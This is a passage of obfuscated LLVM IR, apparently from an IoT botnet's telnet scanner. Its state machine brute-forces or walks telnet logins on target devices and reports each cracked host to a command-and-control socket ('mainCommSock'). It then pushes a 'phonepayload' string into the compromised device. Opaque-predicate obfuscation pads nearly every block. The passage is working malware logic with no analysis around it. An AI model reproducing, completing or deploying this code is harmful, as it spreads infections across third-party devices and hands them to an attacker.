; <label>:537:                                    ; preds = %originalBBpart256
  %538 = load i32, i32* %10, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 7
  %542 = load i32, i32* %541, align 16
  %543 = add i32 %542, 6
  %544 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %545 = icmp ult i32 %543, %544
  br i1 %545, label %546, label %555

; <label>:546:                                    ; preds = %537
  %547 = load i32, i32* %10, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 2
  store i8 0, i8* %550, align 8
  %551 = load i32, i32* %10, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 3
  store i8 1, i8* %554, align 1
  br label %555

; <label>:555:                                    ; preds = %546, %537
  %556 = load i32, i32* @x.89
  %557 = load i32, i32* @y.90
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %555
  %564 = load i32, i32* @x.89
  %565 = load i32, i32* @y.90
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %1111

; <label>:572:                                    ; preds = %159
  %573 = load i32, i32* %10, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 0
  %577 = load i32, i32* %576, align 16
  %578 = call i64 @send(i32 %577, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %579 = icmp slt i64 %578, 0
  br i1 %579, label %580, label %589

; <label>:580:                                    ; preds = %572
  %581 = load i32, i32* %10, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 2
  store i8 0, i8* %584, align 8
  %585 = load i32, i32* %10, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 3
  store i8 1, i8* %588, align 1
  br label %1128

; <label>:589:                                    ; preds = %572
  %590 = load i32, i32* %10, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 2
  store i8 4, i8* %593, align 8
  br label %1111

; <label>:594:                                    ; preds = %159
  %595 = load i32, i32* %10, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 0
  %599 = load i32, i32* %598, align 16
  %600 = load i32, i32* %10, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @read_until_response(i32 %599, i32 10000, i8* %604, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %658

; <label>:607:                                    ; preds = %594
  %608 = load i32, i32* @x.89
  %609 = load i32, i32* @y.90
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %607
  %616 = load i32, i32* %10, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 9
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @contains_fail(i8* %620)
  %622 = icmp ne i32 %621, 0
  %623 = load i32, i32* @x.89
  %624 = load i32, i32* @y.90
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %622, label %631, label %636

; <label>:631:                                    ; preds = %originalBBpart264
  %632 = load i32, i32* %10, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 2
  store i8 0, i8* %635, align 8
  br label %657

; <label>:636:                                    ; preds = %originalBBpart264
  %637 = load i32, i32* @x.89
  %638 = load i32, i32* @y.90
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %636
  %645 = load i32, i32* %10, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 2
  store i8 5, i8* %648, align 8
  %649 = load i32, i32* @x.89
  %650 = load i32, i32* @y.90
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %657

; <label>:657:                                    ; preds = %originalBBpart268, %631
  br label %1128

; <label>:658:                                    ; preds = %594
  %659 = load i32, i32* @x.89
  %660 = load i32, i32* @y.90
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %658
  %667 = load i32, i32* %10, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 7
  %671 = load i32, i32* %670, align 16
  %672 = add i32 %671, 6
  %673 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %674 = icmp ult i32 %672, %673
  %675 = load i32, i32* @x.89
  %676 = load i32, i32* @y.90
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBBpart283, label %originalBB70alteredBB

originalBBpart283:                                ; preds = %originalBB70
  br i1 %674, label %683, label %692

; <label>:683:                                    ; preds = %originalBBpart283
  %684 = load i32, i32* %10, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 2
  store i8 0, i8* %687, align 8
  %688 = load i32, i32* %10, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 3
  store i8 1, i8* %691, align 1
  br label %692

; <label>:692:                                    ; preds = %683, %originalBBpart283
  br label %1111

; <label>:693:                                    ; preds = %159
  %694 = load i32, i32* %10, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 0
  %698 = load i32, i32* %697, align 16
  %699 = call i64 @send(i32 %698, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %700 = icmp slt i64 %699, 0
  br i1 %700, label %701, label %710

; <label>:701:                                    ; preds = %693
  %702 = load i32, i32* %10, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 2
  store i8 0, i8* %705, align 8
  %706 = load i32, i32* %10, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 3
  store i8 1, i8* %709, align 1
  br label %1128

; <label>:710:                                    ; preds = %693
  %711 = load i32, i32* @x.89
  %712 = load i32, i32* @y.90
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %710
  %719 = load i32, i32* %10, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 2
  store i8 6, i8* %722, align 8
  %723 = load i32, i32* @x.89
  %724 = load i32, i32* @y.90
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %1111

; <label>:731:                                    ; preds = %159
  %732 = load i32, i32* %10, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = load i32, i32* %10, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 9
  %741 = load i8*, i8** %740, align 8
  %742 = call i32 @read_until_response(i32 %736, i32 10000, i8* %741, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %743 = icmp ne i32 %742, 0
  br i1 %743, label %744, label %806

; <label>:744:                                    ; preds = %731
  %745 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %746 = load i32, i32* %10, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 7
  store i32 %745, i32* %749, align 16
  %750 = load i32, i32* %10, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 9
  %754 = load i8*, i8** %753, align 8
  %755 = call i32 @contains_fail(i8* %754)
  %756 = icmp ne i32 %755, 0
  br i1 %756, label %757, label %778

; <label>:757:                                    ; preds = %744
  %758 = load i32, i32* @x.89
  %759 = load i32, i32* @y.90
  %760 = sub i32 %758, 1
  %761 = mul i32 %758, %760
  %762 = urem i32 %761, 2
  %763 = icmp eq i32 %762, 0
  %764 = icmp slt i32 %759, 10
  %765 = or i1 %763, %764
  br i1 %765, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %757
  %766 = load i32, i32* %10, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %767
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %768, i32 0, i32 2
  store i8 0, i8* %769, align 8
  %770 = load i32, i32* @x.89
  %771 = load i32, i32* @y.90
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %805

; <label>:778:                                    ; preds = %744
  %779 = load i32, i32* @x.89
  %780 = load i32, i32* @y.90
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %778
  %787 = load i32, i32* @mainCommSock, align 4
  %788 = load i32, i32* %10, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %789
  %791 = call i8* @get_telstate_host(%struct.telstate_t* %790)
  %792 = call i32 (i32, i8*, ...) @sockprintf(i32 %787, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.304, i32 0, i32 0), i8* %791)
  %793 = load i32, i32* %10, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %794
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %795, i32 0, i32 2
  store i8 7, i8* %796, align 8
  %797 = load i32, i32* @x.89
  %798 = load i32, i32* @y.90
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %805

; <label>:805:                                    ; preds = %originalBBpart295, %originalBBpart291
  br label %1128

; <label>:806:                                    ; preds = %731
  %807 = load i32, i32* %10, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 7
  %811 = load i32, i32* %810, align 16
  %812 = add i32 %811, 7
  %813 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %814 = icmp ult i32 %812, %813
  br i1 %814, label %815, label %824

; <label>:815:                                    ; preds = %806
  %816 = load i32, i32* %10, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 2
  store i8 0, i8* %819, align 8
  %820 = load i32, i32* %10, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 3
  store i8 1, i8* %823, align 1
  br label %824

; <label>:824:                                    ; preds = %815, %806
  br label %1111

; <label>:825:                                    ; preds = %159
  %826 = load i32, i32* %10, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 16
  %831 = call i64 @send(i32 %830, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0), i64 4, i32 16384)
  %832 = icmp slt i64 %831, 0
  br i1 %832, label %833, label %858

; <label>:833:                                    ; preds = %825
  %834 = load i32, i32* @x.89
  %835 = load i32, i32* @y.90
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %833
  %842 = load i32, i32* %10, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %843
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %844, i32 0, i32 2
  store i8 0, i8* %845, align 8
  %846 = load i32, i32* %10, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 3
  store i8 1, i8* %849, align 1
  %850 = load i32, i32* @x.89
  %851 = load i32, i32* @y.90
  %852 = sub i32 %850, 1
  %853 = mul i32 %850, %852
  %854 = urem i32 %853, 2
  %855 = icmp eq i32 %854, 0
  %856 = icmp slt i32 %851, 10
  %857 = or i1 %855, %856
  br i1 %857, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %1128

; <label>:858:                                    ; preds = %825
  %859 = load i32, i32* %10, align 4
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %860
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %861, i32 0, i32 2
  store i8 8, i8* %862, align 8
  br label %1111

; <label>:863:                                    ; preds = %159
  %864 = load i32, i32* %10, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %865
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %866, i32 0, i32 0
  %868 = load i32, i32* %867, align 16
  %869 = load i32, i32* %10, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 9
  %873 = load i8*, i8** %872, align 8
  %874 = call i32 @read_until_response(i32 %868, i32 10000, i8* %873, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %875 = icmp ne i32 %874, 0
  br i1 %875, label %876, label %927

; <label>:876:                                    ; preds = %863
  %877 = load i32, i32* %10, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 9
  %881 = load i8*, i8** %880, align 8
  %882 = call i32 @contains_fail(i8* %881)
  %883 = icmp ne i32 %882, 0
  br i1 %883, label %884, label %905

; <label>:884:                                    ; preds = %876
  %885 = load i32, i32* @x.89
  %886 = load i32, i32* @y.90
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %884
  %893 = load i32, i32* %10, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 2
  store i8 0, i8* %896, align 8
  %897 = load i32, i32* @x.89
  %898 = load i32, i32* @y.90
  %899 = sub i32 %897, 1
  %900 = mul i32 %897, %899
  %901 = urem i32 %900, 2
  %902 = icmp eq i32 %901, 0
  %903 = icmp slt i32 %898, 10
  %904 = or i1 %902, %903
  br i1 %904, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %926

; <label>:905:                                    ; preds = %876
  %906 = load i32, i32* @x.89
  %907 = load i32, i32* @y.90
  %908 = sub i32 %906, 1
  %909 = mul i32 %906, %908
  %910 = urem i32 %909, 2
  %911 = icmp eq i32 %910, 0
  %912 = icmp slt i32 %907, 10
  %913 = or i1 %911, %912
  br i1 %913, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %905
  %914 = load i32, i32* %10, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 2
  store i8 9, i8* %917, align 8
  %918 = load i32, i32* @x.89
  %919 = load i32, i32* @y.90
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %926

; <label>:926:                                    ; preds = %originalBBpart2107, %originalBBpart2103
  br label %1128

; <label>:927:                                    ; preds = %863
  %928 = load i32, i32* @x.89
  %929 = load i32, i32* @y.90
  %930 = sub i32 %928, 1
  %931 = mul i32 %928, %930
  %932 = urem i32 %931, 2
  %933 = icmp eq i32 %932, 0
  %934 = icmp slt i32 %929, 10
  %935 = or i1 %933, %934
  br i1 %935, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %927
  %936 = load i32, i32* %10, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 7
  %940 = load i32, i32* %939, align 16
  %941 = add i32 %940, 6
  %942 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %943 = icmp ult i32 %941, %942
  %944 = load i32, i32* @x.89
  %945 = load i32, i32* @y.90
  %946 = sub i32 %944, 1
  %947 = mul i32 %944, %946
  %948 = urem i32 %947, 2
  %949 = icmp eq i32 %948, 0
  %950 = icmp slt i32 %945, 10
  %951 = or i1 %949, %950
  br i1 %951, label %originalBBpart2118, label %originalBB109alteredBB

originalBBpart2118:                               ; preds = %originalBB109
  br i1 %943, label %952, label %961

; <label>:952:                                    ; preds = %originalBBpart2118
  %953 = load i32, i32* %10, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 2
  store i8 0, i8* %956, align 8
  %957 = load i32, i32* %10, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 3
  store i8 1, i8* %960, align 1
  br label %961

; <label>:961:                                    ; preds = %952, %originalBBpart2118
  br label %1111

; <label>:962:                                    ; preds = %159
  %963 = load i32, i32* @x.89
  %964 = load i32, i32* @y.90
  %965 = sub i32 %963, 1
  %966 = mul i32 %963, %965
  %967 = urem i32 %966, 2
  %968 = icmp eq i32 %967, 0
  %969 = icmp slt i32 %964, 10
  %970 = or i1 %968, %969
  br i1 %970, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %962
  %971 = load i32, i32* %10, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 16
  %976 = call i64 @send(i32 %975, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.306, i32 0, i32 0), i64 12, i32 16384)
  %977 = icmp slt i64 %976, 0
  %978 = load i32, i32* @x.89
  %979 = load i32, i32* @y.90
  %980 = sub i32 %978, 1
  %981 = mul i32 %978, %980
  %982 = urem i32 %981, 2
  %983 = icmp eq i32 %982, 0
  %984 = icmp slt i32 %979, 10
  %985 = or i1 %983, %984
  br i1 %985, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %977, label %986, label %995

; <label>:986:                                    ; preds = %originalBBpart2122
  %987 = load i32, i32* %10, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 2
  store i8 0, i8* %990, align 8
  %991 = load i32, i32* %10, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 3
  store i8 1, i8* %994, align 1
  br label %1128

; <label>:995:                                    ; preds = %originalBBpart2122
  %996 = load i32, i32* @x.89
  %997 = load i32, i32* @y.90
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %995
  %1004 = load i32, i32* %10, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 2
  store i8 10, i8* %1007, align 8
  %1008 = load i32, i32* @x.89
  %1009 = load i32, i32* @y.90
  %1010 = sub i32 %1008, 1
  %1011 = mul i32 %1008, %1010
  %1012 = urem i32 %1011, 2
  %1013 = icmp eq i32 %1012, 0
  %1014 = icmp slt i32 %1009, 10
  %1015 = or i1 %1013, %1014
  br i1 %1015, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %1111

; <label>:1016:                                   ; preds = %159
  %1017 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1018 = load i32, i32* %10, align 4
  %1019 = sext i32 %1018 to i64
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1019
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1020, i32 0, i32 7
  store i32 %1017, i32* %1021, align 16
  %1022 = load i32, i32* %10, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 16
  %1027 = load i8*, i8** @phonepayload, align 8
  %1028 = load i8*, i8** @phonepayload, align 8
  %1029 = call i64 @strlen(i8* %1028) #10
  %1030 = call i64 @send(i32 %1026, i8* %1027, i64 %1029, i32 16384)
  %1031 = icmp slt i64 %1030, 0
  br i1 %1031, label %1032, label %1063

; <label>:1032:                                   ; preds = %1016
  %1033 = load i32, i32* @x.89
  %1034 = load i32, i32* @y.90
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %1032
  %1041 = load i32, i32* %10, align 4
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1042
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1043, i32 0, i32 0
  %1045 = load i32, i32* %1044, align 16
  %1046 = call i32 @sclose(i32 %1045)
  %1047 = load i32, i32* %10, align 4
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1048
